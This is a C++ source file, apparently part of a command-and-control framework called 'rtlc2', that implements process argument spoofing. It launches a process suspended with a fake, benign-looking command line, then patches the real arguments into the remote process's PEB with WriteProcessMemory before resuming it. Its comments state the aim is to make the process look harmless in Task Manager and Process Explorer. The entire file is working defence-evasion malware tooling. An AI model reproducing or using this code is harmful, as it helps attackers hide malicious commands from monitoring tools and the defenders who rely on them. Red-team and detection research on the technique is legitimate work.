// Argument Spoofing - Create processes with fake command line arguments
// The process appears benign in Task Manager / Process Explorer
// After creation, real arguments are patched into the PEB
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <winternl.h>
#include <cstring>

namespace rtlc2 {
namespace evasion {

// PEB structures for accessing command line
typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS_FULL;

typedef struct _PEB_FULL {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    RTL_USER_PROCESS_PARAMETERS_FULL* ProcessParameters;
} PEB_FULL;

bool CreateProcessWithSpoofedArgs(const char* real_cmdline, const char* fake_cmdline,
                                  void** hProcess, void** hThread, uint32_t* child_pid) {
    if (!real_cmdline || !fake_cmdline) return false;

    // Step 1: Create process in suspended state with FAKE command line
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    char fake_cmd[MAX_PATH * 2];
    strncpy(fake_cmd, fake_cmdline, sizeof(fake_cmd) - 1);
    fake_cmd[sizeof(fake_cmd) - 1] = '\0';

    if (!CreateProcessA(NULL, fake_cmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return false;

    // Step 2: Read PEB to find ProcessParameters->CommandLine
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
        HANDLE, DWORD, PVOID, ULONG, PULONG);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtQueryInfo = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInfo) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen = 0;
    if (NtQueryInfo(pi.hProcess, 0 /*ProcessBasicInformation*/, &pbi, sizeof(pbi), &retLen) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Step 3: Read PEB from remote process
    PEB_FULL remotePeb = {};
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(remotePeb), &bytesRead)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Step 4: Read ProcessParameters to find CommandLine buffer
    RTL_USER_PROCESS_PARAMETERS_FULL remoteParams = {};
    if (!ReadProcessMemory(pi.hProcess, remotePeb.ProcessParameters, &remoteParams, sizeof(remoteParams), &bytesRead)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Step 5: Convert real command line to wide string
    int realLen = MultiByteToWideChar(CP_ACP, 0, real_cmdline, -1, NULL, 0);
    WCHAR* realWide = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, realLen * sizeof(WCHAR));
    if (!realWide) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    MultiByteToWideChar(CP_ACP, 0, real_cmdline, -1, realWide, realLen);

    // Step 6: Write real command line over the fake one in remote PEB
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(pi.hProcess, remoteParams.CommandLine.Buffer,
                       realWide, realLen * sizeof(WCHAR), &bytesWritten);

    // Update CommandLine length in ProcessParameters
    UNICODE_STRING newCmdLine;
    newCmdLine.Length = (USHORT)((realLen - 1) * sizeof(WCHAR));
    newCmdLine.MaximumLength = (USHORT)(realLen * sizeof(WCHAR));
    newCmdLine.Buffer = remoteParams.CommandLine.Buffer;

    // Calculate offset of CommandLine in ProcessParameters
    SIZE_T cmdLineOffset = offsetof(RTL_USER_PROCESS_PARAMETERS_FULL, CommandLine);
    WriteProcessMemory(pi.hProcess,
                       (BYTE*)remotePeb.ProcessParameters + cmdLineOffset,
                       &newCmdLine, sizeof(UNICODE_STRING), &bytesWritten);

    HeapFree(GetProcessHeap(), 0, realWide);

    // Step 7: Resume the process
    ResumeThread(pi.hThread);

    if (hProcess) *hProcess = pi.hProcess;
    else CloseHandle(pi.hProcess);

    if (hThread) *hThread = pi.hThread;
    else CloseHandle(pi.hThread);

    if (child_pid) *child_pid = pi.dwProcessId;

    return true;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
